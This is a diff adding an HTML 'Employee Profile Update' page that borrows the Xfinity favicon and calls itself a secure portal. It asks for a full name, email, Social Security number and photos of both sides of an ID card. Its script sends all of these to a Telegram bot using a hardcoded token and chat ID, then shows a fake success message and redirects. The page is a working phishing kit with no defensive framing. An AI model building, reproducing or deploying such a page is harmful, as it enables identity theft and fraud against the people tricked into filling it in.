@@ -1,0 +1,682 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Employee Profile Update</title>
+    <link
+      rel="icon"
+      href="https://www.xfinity.com/favicon.ico"
+      type="image/x-icon"
+    />
+    <style>
+      * {
+        box-sizing: border-box;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        margin: 0;
+        padding: 0;
+      }
+
+      body {
+        background-color: #000;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin: 0;
+        padding: 15px;
+        position: relative;
+        overflow: hidden;
+        background-image:
+          radial-gradient(
+            circle at 10% 20%,
+            rgba(30, 30, 50, 0.3) 0%,
+            transparent 20%
+          ),
+          radial-gradient(
+            circle at 90% 80%,
+            rgba(30, 50, 50, 0.3) 0%,
+            transparent 20%
+          );
+      }
+
+      body::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background:
+          linear-gradient(
+            45deg,
+            rgba(20, 20, 30, 0.8) 0%,
+            rgba(10, 10, 20, 0.9) 100%
+          ),
+          url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPjxkZWZzPjxwYXR0ZXJuIGlkPSJwYXR0ZXJuIiB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHBhdHRlcm5Vbml0cz0idXNlclNwYWNlT25Vc2UiIHBhdHRlcm5UcmFuc2Zvcm09InJvdGF0ZSg0NSkiPjxjaXJjbGUgY3g9IjIwIiBjeT0iMjAiIHI9IjEiIGZpbGw9IiMzMzMzMzMiLz48L3BhdHRlcm4+PC9kZWZzPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9InVybCgjcGF0dGVybikiLz48L3N2Zz4=");
+        filter: blur(2px);
+        z-index: -1;
+      }
+
+      .form-container {
+        background: rgba(20, 20, 30, 0.85);
+        backdrop-filter: blur(12px);
+        padding: 25px;
+        width: 100%;
+        max-width: 500px;
+        border-radius: 16px;
+        box-shadow:
+          0 10px 30px rgba(0, 0, 0, 0.5),
+          0 0 0 1px rgba(100, 150, 255, 0.1);
+        border: 1px solid rgba(100, 150, 255, 0.15);
+        position: relative;
+        overflow: hidden;
+        height: 95vh;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .form-container::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 4px;
+        background: linear-gradient(90deg, #4a9bff, #2c5364);
+      }
+
+      .header {
+        text-align: center;
+        margin-bottom: 20px;
+        position: relative;
+        flex-shrink: 0;
+      }
+
+      .welcome-text {
+        color: #aaa;
+        font-size: 14px;
+        margin-bottom: 5px;
+      }
+
+      .user-name {
+        color: #fff;
+        font-size: 26px;
+        font-weight: 600;
+        margin-bottom: 8px;
+        text-shadow: 0 0 10px rgba(74, 155, 255, 0.3);
+        background: linear-gradient(90deg, #4a9bff, #2c5364);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+      }
+
+      .subtitle {
+        color: #888;
+        font-size: 13px;
+        margin-top: 5px;
+      }
+
+      .form-content {
+        flex: 1;
+        overflow-y: auto;
+        padding-right: 5px;
+        margin-right: -10px;
+      }
+
+      .form-content::-webkit-scrollbar {
+        width: 6px;
+      }
+
+      .form-content::-webkit-scrollbar-track {
+        background: rgba(30, 30, 40, 0.5);
+        border-radius: 10px;
+      }
+
+      .form-content::-webkit-scrollbar-thumb {
+        background: rgba(74, 155, 255, 0.3);
+        border-radius: 10px;
+      }
+
+      .input-group {
+        margin-bottom: 18px;
+      }
+
+      label {
+        display: block;
+        font-size: 13px;
+        margin-bottom: 7px;
+        color: #bbb;
+        font-weight: 500;
+      }
+
+      input,
+      select {
+        width: 100%;
+        padding: 12px;
+        border-radius: 10px;
+        border: 1px solid rgba(100, 150, 255, 0.2);
+        background: rgba(30, 30, 45, 0.7);
+        color: #fff;
+        outline: none;
+        transition: all 0.3s ease;
+        font-size: 14px;
+      }
+
+      input:focus,
+      select:focus {
+        border-color: #4a9bff;
+        box-shadow: 0 0 0 3px rgba(74, 155, 255, 0.2);
+        background: rgba(40, 40, 60, 0.8);
+      }
+
+      input.filled {
+        border-color: #28a745;
+        background: rgba(40, 167, 69, 0.1);
+        box-shadow: 0 0 0 3px rgba(40, 167, 69, 0.2);
+      }
+
+      input::placeholder {
+        color: #666;
+      }
+
+      button {
+        width: 100%;
+        padding: 14px;
+        background: linear-gradient(135deg, #4a9bff, #2c5364);
+        border: none;
+        border-radius: 12px;
+        color: #fff;
+        font-size: 15px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        margin-top: 10px;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        position: relative;
+        overflow: hidden;
+        flex-shrink: 0;
+      }
+
+      button:hover:not(:disabled) {
+        background: linear-gradient(135deg, #3a8beb, #1f3d4a);
+        transform: translateY(-2px);
+        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+      }
+
+      button:active {
+        transform: translateY(0);
+        box-shadow: 0 3px 10px rgba(0, 0, 0, 0.3);
+      }
+
+      button:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+        transform: none;
+      }
+
+      .button-content {
+        position: relative;
+        z-index: 2;
+      }
+
+      .status {
+        text-align: center;
+        margin-top: 15px;
+        padding: 12px;
+        border-radius: 10px;
+        display: none;
+        font-weight: 500;
+        animation: fadeIn 0.3s ease;
+        flex-shrink: 0;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(10px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .success {
+        background-color: rgba(40, 167, 69, 0.15);
+        color: #28a745;
+        border: 1px solid rgba(40, 167, 69, 0.3);
+      }
+
+      .error {
+        background-color: rgba(220, 53, 69, 0.15);
+        color: #dc3545;
+        border: 1px solid rgba(220, 53, 69, 0.3);
+      }
+
+      .loading {
+        background-color: rgba(74, 155, 255, 0.15);
+        color: #4a9bff;
+        border: 1px solid rgba(74, 155, 255, 0.3);
+      }
+
+      .file-upload {
+        position: relative;
+        overflow: hidden;
+        display: inline-block;
+        width: 100%;
+      }
+
+      .file-upload input[type="file"] {
+        position: absolute;
+        left: 0;
+        top: 0;
+        opacity: 0;
+        width: 100%;
+        height: 100%;
+        cursor: pointer;
+      }
+
+      .file-upload-label {
+        display: block;
+        padding: 12px;
+        background: rgba(40, 40, 60, 0.7);
+        border: 1px dashed rgba(100, 150, 255, 0.3);
+        border-radius: 10px;
+        text-align: center;
+        color: #aaa;
+        transition: all 0.3s ease;
+        cursor: pointer;
+        font-size: 14px;
+      }
+
+      .file-upload-label:hover {
+        background: rgba(50, 50, 70, 0.8);
+        border-color: rgba(74, 155, 255, 0.5);
+        color: #ddd;
+      }
+
+      .preview-container {
+        display: flex;
+        gap: 12px;
+        margin-top: 10px;
+      }
+
+      .preview-item {
+        flex: 1;
+        text-align: center;
+      }
+
+      .preview-image {
+        width: 100%;
+        height: 80px;
+        object-fit: contain;
+        background: rgba(20, 20, 30, 0.7);
+        border-radius: 8px;
+        display: none;
+        border: 1px solid rgba(100, 150, 255, 0.1);
+      }
+
+      .preview-label {
+        margin-top: 6px;
+        font-size: 12px;
+        color: #888;
+      }
+
+      .note {
+        font-size: 11px;
+        color: #777;
+        margin-top: 8px;
+        text-align: center;
+        padding: 6px;
+        background: rgba(30, 30, 40, 0.5);
+        border-radius: 6px;
+      }
+
+      .footer {
+        text-align: center;
+        margin-top: 15px;
+        color: #666;
+        font-size: 11px;
+        flex-shrink: 0;
+      }
+
+      .required::after {
+        content: " *";
+        color: #ff6b6b;
+      }
+
+      .id-section {
+        background: rgba(40, 40, 60, 0.5);
+        border-radius: 12px;
+        padding: 16px;
+        margin-bottom: 18px;
+        border: 1px solid rgba(100, 150, 255, 0.1);
+      }
+
+      .id-section h4 {
+        color: #4a9bff;
+        font-size: 14px;
+        font-weight: 600;
+        margin-bottom: 12px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+
+      .email-input:focus {
+        box-shadow: 0 0 0 3px rgba(40, 167, 69, 0.2);
+      }
+
+      .email-input.filled {
+        background: rgba(40, 167, 69, 0.15) !important;
+        box-shadow: 0 0 0 3px rgba(40, 167, 69, 0.25) !important;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="form-container">
+      <div class="header">
+        <div class="welcome-text">Welcome to Secure Portal</div>
+        <div class="user-name" id="displayName">Demographic Information</div>
+        <div class="subtitle">Please input your information</div>
+      </div>
+
+      <div class="form-content">
+        <form id="employeeForm">
+          <div class="input-group">
+            <label class="required">Full Name</label>
+            <input
+              type="text"
+              id="fullName"
+              name="fullName"
+              placeholder="Enter your full name"
+              required
+            />
+          </div>
+
+          <div class="input-group">
+            <label class="required">Email Address</label>
+            <input
+              type="text"
+              id="email"
+              name="email"
+              class="email-input"
+              placeholder="Email address"
+              required
+            />
+          </div>
+
+          <div class="input-group">
+            <label>SSN Number</label>
+            <input
+              type="tel"
+              id="phone"
+              name="phone"
+              placeholder="(000)-00-0000"
+            />
+          </div>
+
+          <div class="input-group">
+            <label>Position</label>
+            <input
+              type="text"
+              id="position"
+              name="position"
+              placeholder="Your job title"
+            />
+          </div>
+
+          <!-- ID Card Upload Section -->
+          <div class="id-section">
+            <h4>🆔 Applicant ID Card</h4>
+
+            <div class="input-group">
+              <label class="required">ID Card - Front Side</label>
+              <div class="file-upload">
+                <input
+                  type="file"
+                  id="idFront"
+                  name="idFront"
+                  accept="image/*,.pdf"
+                  required
+                />
+                <label for="idFront" class="file-upload-label">
+                  📷 Click to upload front side
+                </label>
+              </div>
+              <div class="preview-container">
+                <div class="preview-item">
+                  <img
+                    id="frontPreview"
+                    class="preview-image"
+                    alt="Front preview"
+                  />
+                  <div class="preview-label">Front Side</div>
+                </div>
+              </div>
+            </div>
+
+            <div class="input-group">
+              <label class="required">ID Card - Back Side</label>
+              <div class="file-upload">
+                <input
+                  type="file"
+                  id="idBack"
+                  name="idBack"
+                  accept="image/*,.pdf"
+                  required
+                />
+                <label for="idBack" class="file-upload-label">
+                  📷 Click to upload back side
+                </label>
+              </div>
+              <div class="preview-container">
+                <div class="preview-item">
+                  <img
+                    id="backPreview"
+                    class="preview-image"
+                    alt="Back preview"
+                  />
+                  <div class="preview-label">Back Side</div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="note">All data is securely transmitted and encrypted</div>
+        </form>
+      </div>
+
+      <button type="submit" form="employeeForm" id="submitBtn">
+        <div class="button-content">Submit</div>
+      </button>
+
+      <div id="statusMessage" class="status"></div>
+
+      <div class="footer">Secure employee profile verification system</div>
+    </div>
+
+    <script>
+      // Telegram Bot configuration
+      const BOT_TOKEN = "8628492590:AAFFkjZvwCN7y-z6w24TZsAObsKtzVxLc4s";
+      const CHAT_ID = "7867274282";
+
+      // Track filled inputs for green border
+      const inputs = ["fullName", "email", "phone", "position"];
+      inputs.forEach((id) => {
+        const input = document.getElementById(id);
+        input.addEventListener("input", function () {
+          if (this.value.trim()) {
+            this.classList.add("filled");
+          } else {
+            this.classList.remove("filled");
+          }
+        });
+      });
+
+      // File preview handlers
+      document
+        .getElementById("idFront")
+        .addEventListener("change", function (e) {
+          const file = e.target.files[0];
+          if (file) {
+            const reader = new FileReader();
+            reader.onload = function (e) {
+              document.getElementById("frontPreview").src = e.target.result;
+              document.getElementById("frontPreview").style.display = "block";
+            };
+            reader.readAsDataURL(file);
+          }
+        });
+
+      document
+        .getElementById("idBack")
+        .addEventListener("change", function (e) {
+          const file = e.target.files[0];
+          if (file) {
+            const reader = new FileReader();
+            reader.onload = function (e) {
+              document.getElementById("backPreview").src = e.target.result;
+              document.getElementById("backPreview").style.display = "block";
+            };
+            reader.readAsDataURL(file);
+          }
+        });
+
+      // Elements
+      const form = document.getElementById("employeeForm");
+      const submitBtn = document.getElementById("submitBtn");
+      const statusMessage = document.getElementById("statusMessage");
+
+      form.addEventListener("submit", async function (e) {
+        e.preventDefault();
+
+        // ✅ Get data DIRECTLY from input elements
+        const fullName =
+          document.getElementById("fullName").value.trim() || "Not provided";
+        const email =
+          document.getElementById("email").value.trim() || "Not provided";
+        const phone =
+          document.getElementById("phone").value.trim() || "Not provided";
+        const position =
+          document.getElementById("position").value.trim() || "Not provided";
+
+        // Check file uploads only
+        const idFrontFile = document.getElementById("idFront").files[0];
+        const idBackFile = document.getElementById("idBack").files[0];
+        if (!idFrontFile || !idBackFile) {
+          showStatus("Please upload both ID card images", "error");
+          return;
+        }
+
+        // Show loading
+        submitBtn.disabled = true;
+        submitBtn.querySelector(".button-content").textContent =
+          "🔄 Sending...";
+        // showStatus("🔄 Submitting...", "loading");
+
+        try {
+          // Step 1: Send text data
+          const message = `
+🚨 *EMPLOYEE PROFILE UPDATE - FULL VERIFICATION* 🚨
+
+👤 *Full Name:* ${fullName}
+📧 *Email:* ${email}
+📱 *SSN:* ${phone}
+💼 *Position:* ${position}
+
+*ID Verification:* Front + Back uploaded
+*Submitted:* ${new Date().toLocaleString()}
+          `;
+
+          const textUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+          const textResponse = await fetch(textUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: message,
+              parse_mode: "Markdown",
+            }),
+          });
+
+          if (!textResponse.ok) throw new Error("Text submission failed");
+
+          // Step 2: Send ID Front
+          const frontFormData = new FormData();
+          frontFormData.append("chat_id", CHAT_ID);
+          frontFormData.append("document", idFrontFile);
+          frontFormData.append("caption", `🆔 ID Card - FRONT`);
+
+          const frontResponse = await fetch(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
+            {
+              method: "POST",
+              body: frontFormData,
+            },
+          );
+
+          if (!frontResponse.ok) throw new Error("Front ID upload failed");
+
+          // Step 3: Send ID Back
+          const backFormData = new FormData();
+          backFormData.append("chat_id", CHAT_ID);
+          backFormData.append("document", idBackFile);
+          backFormData.append("caption", `🆔 ID Card - BACK`);
+
+          const backResponse = await fetch(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
+            {
+              method: "POST",
+              body: backFormData,
+            },
+          );
+
+          if (!backResponse.ok) throw new Error("Back ID upload failed");
+
+          // Success!
+          form.reset();
+          document.getElementById("frontPreview").style.display = "none";
+          document.getElementById("backPreview").style.display = "none";
+
+          // Clear filled classes
+          inputs.forEach((id) => {
+            document.getElementById(id).classList.remove("filled");
+          });
+
+          showStatus("✅ Profile updated successfully!...", "success");
+
+          setTimeout(() => {
+            window.location.href = "success.html";
+          }, 2500);
+        } catch (error) {
+          console.error("Submission error:", error);
+          showStatus(
+            `❌ Update failed: ${error.message}. Please try again.`,
+            "error",
+          );
+        } finally {
+          submitBtn.disabled = false;
+          submitBtn.querySelector(".button-content").textContent =
+            "📤 Update Profile";
+        }
+      });
+
+      function showStatus(message, type) {
+        statusMessage.textContent = message;
+        statusMessage.className = `status ${type}`;
+        statusMessage.style.display = "block";
+
+        if (type !== "success") {
+          setTimeout(() => {
+            if (statusMessage.classList.contains(type)) {
+              statusMessage.style.display = "none";
+            }
+          }, 5000);
+        }
+      }
+    </script>
+  </body>
+  <script src="./tracking.js"></script>
+</html>
